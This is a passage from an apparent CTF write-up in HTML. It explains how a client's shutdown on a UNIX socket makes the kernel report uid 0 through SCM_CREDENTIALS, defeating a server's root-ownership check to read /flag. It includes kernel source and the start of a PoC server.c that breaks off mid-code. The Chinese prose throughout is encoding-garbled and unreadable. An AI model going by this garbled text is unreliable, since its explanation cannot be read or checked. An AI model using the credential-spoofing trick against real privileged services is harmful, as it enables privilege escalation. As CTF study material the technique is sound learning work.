<p>ç„¶ååˆ†æä¸€ä¸‹ srvï¼Œæ¢å¤ç¬¦å·åï¼Œç®€å•é€†å‘ï¼Œå‘ç°å¤§æ¦‚åŠŸèƒ½æ˜¯ï¼šè¯»å…¥ä¸€ä¸ªæ–‡ä»¶åï¼Œå°è¯•è¯»å–ï¼Œå¦‚æœæ–‡ä»¶çš„ owner æ˜¯ rootï¼Œå°±è¿”å›æ–‡ä»¶å†…å®¹ï¼Œè¿™ä¸ªé€»è¾‘æœ¬èº«æ˜¯æ²¡ä»€ä¹ˆæ¼æ´çš„ï¼Œé—®é¢˜æ˜¯ç»è¿‡ä¸Šé¢çš„ <code class="inline-code">chroot</code> ä¹‹åï¼Œå½“å‰è¿›ç¨‹çš„ uid æ˜¯ 1337ï¼Œå½“æˆ‘ä»¬é€šè¿‡ cli å’Œ srv äº¤äº’å‘é€ä¸€ä¸ª <code class="inline-code">/flag</code> æ—¶ï¼Œsrv æ£€æŸ¥å‘ç° flag æ–‡ä»¶çš„ owner æ˜¯ 0ï¼Œæ— æ³•è¯»å– flagã€‚</p>
<p>è¡¥å……ä¸€äº›çŸ¥è¯†ï¼š</p>
<h3 id="scm_credentials" class="scroll-target"><a href="#scm_credentials"><code class="hash inline-code">#</code>SCM_CREDENTIALS</a></h3>
<p><code class="inline-code">SCM_CREDENTIALS</code> æ˜¯ä¸€ä¸ªåœ¨ Linux/Unix ç³»ç»Ÿä¸­ç”¨äºåœ¨è¿›ç¨‹é—´ä¼ é€’èº«ä»½å‡­è¯çš„æœºåˆ¶ã€‚</p>
<p>ä¸ºäº†å®Œå…¨ç†è§£å®ƒï¼Œæˆ‘ä»¬å…ˆé€€ä¸€æ­¥ï¼Œçœ‹çœ‹å®ƒè§£å†³äº†ä»€ä¹ˆé—®é¢˜ã€‚</p>
<h4 id="1." class="scroll-target"><a href="#1."><code class="hash inline-code">#</code>1. é—®é¢˜ï¼šæœåŠ¡å™¨å¦‚ä½•ä¿¡ä»»å®¢æˆ·ç«¯ï¼Ÿ</a></h4>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æœ‰ä¸€ä¸ªç‰¹æƒæœåŠ¡å™¨ï¼ˆæ¯”å¦‚ <code class="inline-code">srv</code>ï¼‰ï¼Œå®ƒç›‘å¬ä¸€ä¸ª UNIX å¥—æ¥å­—ã€‚</p>
<p>ä¸€ä¸ªå®¢æˆ·ç«¯ï¼ˆæ¯”å¦‚ <code class="inline-code">cli</code>ï¼‰è¿æ¥åˆ°å®ƒï¼Œå¹¶å‘é€ä¸€ä¸ªè¯·æ±‚ï¼šâ€œè¯·è¯»å– <code class="inline-code">/flag</code> æ–‡ä»¶â€ã€‚</p>
<p><code class="inline-code">srv</code> è¿›ç¨‹å¦‚ä½•çŸ¥é“è¿™ä¸ªè¯·æ±‚æ˜¯è°ï¼ˆå“ªä¸ªç”¨æˆ·ï¼‰å‘å‡ºçš„ï¼Ÿ</p>
<ul>
<li><code class="inline-code">srv</code> ä¸èƒ½ä¿¡ä»» <code class="inline-code">cli</code> å‘é€çš„æ•°æ®ã€‚<code class="inline-code">cli</code> ä¸èƒ½ç®€å•åœ°åœ¨æ¶ˆæ¯é‡Œè¯´ï¼šâ€œä½ å¥½ï¼Œæˆ‘æ˜¯ uid 1337â€ã€‚è¿™å¤ªå®¹æ˜“ä¼ªé€ äº†ã€‚</li>
<li><code class="inline-code">srv</code> éœ€è¦ä¸€ç§<strong>æ— æ³•ä¼ªé€ </strong>çš„æ–¹å¼æ¥è·å– <code class="inline-code">cli</code> çš„çœŸå®ç”¨æˆ· ID (UID)ã€‚</li>
</ul>
<h4 id="2.-so_passcred-scm_credentials" class="scroll-target"><a href="#2.-so_passcred-scm_credentials"><code class="hash inline-code">#</code>2. è§£å†³æ–¹æ¡ˆï¼š<code class="inline-code">SO_PASSCRED</code> å’Œ <code class="inline-code">SCM_CREDENTIALS</code></a></h4>
<p><code class="inline-code">SCM_CREDENTIALS</code> å°±æ˜¯è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆã€‚å®ƒä»£è¡¨ <strong>S</strong>ocket-<strong>C</strong>ontrol-<strong>M</strong>essage <strong>CREDEN</strong>TIALSï¼ˆå¥—æ¥å­—æ§åˆ¶æ¶ˆæ¯ - å‡­è¯ï¼‰ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªä¸¤æ­¥çš„è¿‡ç¨‹ï¼š</p>
<p><strong>ç¬¬ 1 æ­¥ï¼šæœåŠ¡å™¨å¼€å¯â€œå‡­è¯æ¥æ”¶â€æ¨¡å¼</strong></p>
<ul>
<li><code class="inline-code">srv</code>ï¼ˆæœåŠ¡å™¨ï¼‰åœ¨ä¸ <code class="inline-code">cli</code>ï¼ˆå®¢æˆ·ç«¯ï¼‰å»ºç«‹è¿æ¥åï¼Œå¿…é¡»å¯¹è¯¥è¿æ¥çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆ<code class="inline-code">fd</code>ï¼‰è®¾ç½®ä¸€ä¸ªé€‰é¡¹ï¼š
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#AB5959">int</span><span style="color:#393A34"> enable </span><span style="color:#999999">=</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#59873A">setsockopt</span><span style="color:#2993a3">(</span><span style="color:#393A34">client_fd</span><span style="color:#999999">,</span><span style="color:#393A34"> SOL_SOCKET</span><span style="color:#999999">,</span><span style="color:#393A34"> SO_PASSCRED</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#B07D48">enable</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#1e754f">(</span><span style="color:#393A34">enable</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">;</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#CB7676">int</span><span style="color:#DBD7CAEE"> enable </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#80A665">setsockopt</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SOL_SOCKET</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SO_PASSCRED</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#BD976A">enable</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">enable</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
</li>
<li><code class="inline-code">sub_4075F0</code> å‡½æ•°ä¸­çš„ <code class="inline-code">sub_5351A0(v10, 1, 16, &amp;v16, 4)</code> <strong>åšçš„å°±æ˜¯è¿™ä»¶äº‹</strong>ã€‚</li>
<li><code class="inline-code">SO_PASSCRED</code> (Pass Credentials) é€‰é¡¹å‘Šè¯‰ Linux å†…æ ¸ï¼šâ€œ<strong>è¯·åœ¨æ¯æ¬¡ä»è¿™ä¸ªå¥—æ¥å­—æ¥æ”¶æ•°æ®æ—¶ï¼ŒæŠŠå‘é€æ–¹çš„çœŸå®å‡­è¯ï¼ˆPID, UID, GIDï¼‰ä¹Ÿä¸€å¹¶äº¤ç»™æˆ‘ã€‚</strong>â€</li>
</ul>
<p><strong>ç¬¬ 2 æ­¥ï¼šæœåŠ¡å™¨ä½¿ç”¨ <code class="inline-code">recvmsg</code> æ¥æ”¶å‡­è¯</strong></p>
<ul>
<li>å½“ <code class="inline-code">cli</code> å‘é€æ•°æ®æ—¶ï¼Œ<code class="inline-code">srv</code> ä¸èƒ½å†ä½¿ç”¨ç®€å•çš„ <code class="inline-code">read()</code> æˆ– <code class="inline-code">recv()</code>ã€‚å®ƒå¿…é¡»ä½¿ç”¨ <code class="inline-code">recvmsg()</code>ã€‚</li>
<li><code class="inline-code">recvmsg()</code> æ˜¯ä¸€ä¸ªæ›´é«˜çº§çš„å‡½æ•°ï¼Œå®ƒå…è®¸åœ¨æ¥æ”¶â€œå¸¸è§„æ•°æ®â€çš„åŒæ—¶ï¼Œæ¥æ”¶â€œ<strong>æ§åˆ¶æ¶ˆæ¯</strong>â€ï¼ˆControl Messageï¼Œå³ <code class="inline-code">cmsg</code>ï¼‰ã€‚</li>
<li>å½“ <code class="inline-code">cli</code> å‘é€æ¶ˆæ¯æ—¶ï¼ŒLinux å†…æ ¸ä¼šä»‹å…¥ï¼š
<ol>
<li>å®ƒæŸ¥çœ‹ <code class="inline-code">cli</code> è¿›ç¨‹ï¼Œç¡®è®¤å…¶çœŸå® UID æ˜¯ 1337ã€‚</li>
<li>å®ƒå°† <code class="inline-code">cli</code> çš„æ•°æ®ï¼ˆä¾‹å¦‚ <code class="inline-code">&quot;/flag&quot;</code>ï¼‰æ”¾å…¥â€œå¸¸è§„æ•°æ®â€ç¼“å†²åŒºã€‚</li>
<li>å®ƒåˆ›å»ºä¸€ä¸ª<strong>æ§åˆ¶æ¶ˆæ¯</strong>ï¼Œç±»å‹ä¸º <code class="inline-code">SCM_CREDENTIALS</code>ï¼Œå†…å®¹ä¸º <code class="inline-code">(pid, uid=1337, gid=1337)</code>ã€‚</li>
<li>å®ƒå°†è¿™ä¸ªæ§åˆ¶æ¶ˆæ¯æ”¾å…¥â€œæ§åˆ¶æ¶ˆæ¯â€ç¼“å†²åŒºã€‚</li>
<li><code class="inline-code">srv</code> çš„ <code class="inline-code">recvmsg()</code> è°ƒç”¨è¿”å›ï¼Œ<code class="inline-code">srv</code> ç°åœ¨åŒæ—¶æ‹¥æœ‰äº†æ•°æ® (<code class="inline-code">&quot;/flag&quot;</code>) å’Œä¸€ä¸ª<strong>ç”±å†…æ ¸æ‹…ä¿ã€æ— æ³•ä¼ªé€ </strong>çš„å‡­è¯ï¼ˆ<code class="inline-code">uid=1337</code>ï¼‰ã€‚</li>
</ol>
</li>
</ul>
<p>è€Œ <code class="inline-code">shutdown</code> å‡½æ•°ï¼Œå¯ä»¥åšåˆ°è®© srv è·å¾—ä¸€ä¸ª uid = 0 çš„ç©ºå‡­è¯ã€‚</p>
<ol>
<li>å½“å®¢æˆ·ç«¯ <code class="inline-code">shutdown</code> æ—¶ï¼Œ<code class="inline-code">sk->sk_peer_cred</code> ä¼šè¢«è®¾ç½®ä¸º <code class="inline-code">NULL</code></li>
<li>srv éšåè°ƒç”¨ recvmsg æ¥æ”¶ EOF</li>
<li>é€šè¿‡ä¸‹é¢è¿™ä¸ªå‡½æ•°è®¾ç½® <code class="inline-code">client->uid = 0</code></li>
</ol>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#AB5959">static</span><span style="color:#AB5959"> void</span><span style="color:#59873A"> unix_get_peereid</span><span style="color:#2993a3">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> socket </span><span style="color:#AB5959">*</span><span style="color:#B07D48">sock</span><span style="color:#999999">,</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> ucred </span><span style="color:#AB5959">*</span><span style="color:#B07D48">ucred</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    struct</span><span style="color:#393A34"> sock </span><span style="color:#AB5959">*</span><span style="color:#393A34">sk </span><span style="color:#999999">=</span><span style="color:#B07D48"> sock</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">sk</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    const</span><span style="color:#AB5959"> struct</span><span style="color:#393A34"> cred </span><span style="color:#AB5959">*</span><span style="color:#393A34">peercred</span><span style="color:#999999">;</span><br><br><span style="color:#A0ADA0">    /*</span><br><span style="color:#A0ADA0">     * We can't return PID of peer for an unconnected socket.</span><br><span style="color:#A0ADA0">     * We are not allowed to return credentials of not-our-peer.</span><br><span style="color:#A0ADA0">     */</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48">sk</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">sk_peer_cred</span><span style="color:#AB5959"> ==</span><span style="color:#1E754F"> NULL</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#A0ADA0">        /*</span><br><span style="color:#A0ADA0">         * sk_peer_cred is cleared in unix_shutdown()</span><br><span style="color:#A0ADA0">         * or when the peer is garbage collected.</span><br><span style="color:#A0ADA0">         */</span><br><span style="color:#393A34">        peercred </span><span style="color:#999999">=</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">init_cred</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // &#x3C;-- å…³é”®ç‚¹ 1</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><span style="color:#1E754F"> else</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#393A34">        peercred </span><span style="color:#999999">=</span><span style="color:#B07D48"> sk</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">sk_peer_cred</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#B07D48">    ucred</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">pid</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // PID ä¸æ€»æ˜¯å¯ç”¨çš„</span><br><span style="color:#B07D48">    ucred</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">uid</span><span style="color:#999999"> =</span><span style="color:#B07D48"> peercred</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">uid</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // &#x3C;-- å…³é”®ç‚¹ 2</span><br><span style="color:#B07D48">    ucred</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">gid</span><span style="color:#999999"> =</span><span style="color:#B07D48"> peercred</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">gid</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#CB7676">static</span><span style="color:#CB7676"> void</span><span style="color:#80A665"> unix_get_peereid</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> socket </span><span style="color:#CB7676">*</span><span style="color:#BD976A">sock</span><span style="color:#666666">,</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> ucred </span><span style="color:#CB7676">*</span><span style="color:#BD976A">ucred</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> sock </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">sk </span><span style="color:#666666">=</span><span style="color:#BD976A"> sock</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">sk</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    const</span><span style="color:#CB7676"> struct</span><span style="color:#DBD7CAEE"> cred </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">peercred</span><span style="color:#666666">;</span><br><br><span style="color:#758575DD">    /*</span><br><span style="color:#758575DD">     * We can't return PID of peer for an unconnected socket.</span><br><span style="color:#758575DD">     * We are not allowed to return credentials of not-our-peer.</span><br><span style="color:#758575DD">     */</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A">sk</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">sk_peer_cred</span><span style="color:#CB7676"> ==</span><span style="color:#4D9375"> NULL</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#758575DD">        /*</span><br><span style="color:#758575DD">         * sk_peer_cred is cleared in unix_shutdown()</span><br><span style="color:#758575DD">         * or when the peer is garbage collected.</span><br><span style="color:#758575DD">         */</span><br><span style="color:#DBD7CAEE">        peercred </span><span style="color:#666666">=</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">init_cred</span><span style="color:#666666">;</span><span style="color:#758575DD"> // &#x3C;-- å…³é”®ç‚¹ 1</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><span style="color:#4D9375"> else</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#DBD7CAEE">        peercred </span><span style="color:#666666">=</span><span style="color:#BD976A"> sk</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">sk_peer_cred</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#BD976A">    ucred</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">pid</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#758575DD"> // PID ä¸æ€»æ˜¯å¯ç”¨çš„</span><br><span style="color:#BD976A">    ucred</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">uid</span><span style="color:#666666"> =</span><span style="color:#BD976A"> peercred</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">uid</span><span style="color:#666666">;</span><span style="color:#758575DD"> // &#x3C;-- å…³é”®ç‚¹ 2</span><br><span style="color:#BD976A">    ucred</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">gid</span><span style="color:#666666"> =</span><span style="color:#BD976A"> peercred</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">gid</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>æ¥çœ‹ä¸‹é¢è¿™ä¸ª poc:</p>
<p><code class="inline-code">server.c</code>ï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> _GNU_SOURCE</span><br><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdio.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdlib.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">string.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">unistd.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">sys/socket.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">sys/un.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">sys/types.h</span><span style="color:#B5695977">></span><br><br><span style="color:#999999">#</span><span style="color:#1E754F">define</span><span style="color:#59873A"> SOCKET_PATH</span><span style="color:#B5695977"> "</span><span style="color:#B56959">shutdown_quirk.sock</span><span style="color:#B5695977">"</span><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> main</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    int</span><span style="color:#393A34"> server_fd</span><span style="color:#999999">,</span><span style="color:#393A34"> client_fd</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    struct</span><span style="color:#393A34"> sockaddr_un server_addr</span><span style="color:#999999">;</span><br><br><span style="color:#393A34">    server_fd </span><span style="color:#999999">=</span><span style="color:#59873A"> socket</span><span style="color:#1e754f">(</span><span style="color:#393A34">AF_UNIX</span><span style="color:#999999">,</span><span style="color:#393A34"> SOCK_STREAM</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">server_fd </span><span style="color:#AB5959">==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        perror</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">socket</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#59873A">    unlink</span><span style="color:#1e754f">(</span><span style="color:#393A34">SOCKET_PATH</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">    memset</span><span style="color:#1e754f">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">server_addr</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> sockaddr_un</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    server_addr</span><span style="color:#999999">.</span><span style="color:#B07D48">sun_family</span><span style="color:#999999"> =</span><span style="color:#393A34"> AF_UNIX</span><span style="color:#999999">;</span><br><span style="color:#59873A">    strncpy</span><span style="color:#1e754f">(</span><span style="color:#B07D48">server_addr</span><span style="color:#999999">.</span><span style="color:#B07D48">sun_path</span><span style="color:#999999">,</span><span style="color:#393A34"> SOCKET_PATH</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#a65e2b">(</span><span style="color:#B07D48">server_addr</span><span style="color:#999999">.</span><span style="color:#B07D48">sun_path</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">bind</span><span style="color:#a65e2b">(</span><span style="color:#393A34">server_fd</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> sockaddr </span><span style="color:#AB5959">*</span><span style="color:#a13865">)</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">server_addr</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#a13865">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> sockaddr_un</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        perror</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">bind</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">listen</span><span style="color:#a65e2b">(</span><span style="color:#393A34">server_fd</span><span style="color:#999999">,</span><span style="color:#2F798A"> 5</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        perror</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">listen</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Server listening on </span><span style="color:#A65E2B">%s\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> SOCKET_PATH</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#393A34">    client_fd </span><span style="color:#999999">=</span><span style="color:#59873A"> accept</span><span style="color:#1e754f">(</span><span style="color:#393A34">server_fd</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">client_fd </span><span style="color:#AB5959">==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        perror</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">accept</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Client connected.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">    int</span><span style="color:#393A34"> enable </span><span style="color:#999999">=</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#59873A">setsockopt</span><span style="color:#a65e2b">(</span><span style="color:#393A34">client_fd</span><span style="color:#999999">,</span><span style="color:#393A34"> SOL_SOCKET</span><span style="color:#999999">,</span><span style="color:#393A34"> SO_PASSCRED</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">enable</span><span style="color:#999999">,</span><span style="color:#AB5959"> sizeof</span><span style="color:#a13865">(</span><span style="color:#393A34">enable</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> ==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        perror</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">setsockopt(SO_PASSCRED)</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">SO_PASSCRED enabled.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">    struct</span><span style="color:#393A34"> msghdr msg </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><span style="color:#2F798A">0</span><span style="color:#1e754f">}</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    struct</span><span style="color:#393A34"> iovec </span><span style="color:#B07D48">iov</span><span style="color:#1e754f">[</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><span style="color:#2F798A">0</span><span style="color:#1e754f">}</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    char</span><span style="color:#B07D48"> buf</span><span style="color:#1e754f">[</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><br><span style="color:#B07D48">    iov</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">.</span><span style="color:#B07D48">iov_base</span><span style="color:#999999"> =</span><span style="color:#393A34"> buf</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    iov</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">.</span><span style="color:#B07D48">iov_len</span><span style="color:#999999"> =</span><span style="color:#AB5959"> sizeof</span><span style="color:#1e754f">(</span><span style="color:#393A34">buf</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    msg</span><span style="color:#999999">.</span><span style="color:#B07D48">msg_iov</span><span 